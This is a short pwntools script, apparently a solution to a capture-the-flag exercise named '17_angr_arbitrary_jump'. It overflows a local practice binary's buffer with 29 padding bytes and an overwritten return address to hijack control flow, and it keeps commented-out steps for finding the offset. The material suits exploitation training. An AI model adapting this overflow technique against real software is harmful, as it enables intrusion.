# from pwn import *
# p = process("./17_angr_arbitrary_jump.elf")
# payload = b'a' * 0x19 + p32(0xdeadbeef) + p32(0x58465164)
# p.sendline(payload)
# p.interactive()


# from pwn import *
# p = process("./17_angr_arbitrary_jump.elf", aslr=False)
# p.sendline(cyclic(100))
# p.wait()
# core = p.corefile
# print(hex(core.eip))
# print(cyclic_find(core.eip))


from pwn import *


p = process("./17_angr_arbitrary_jump.elf")
payload = b"A" * 29 + p32(0x58465164)
p.sendline(payload)
p.interactive()
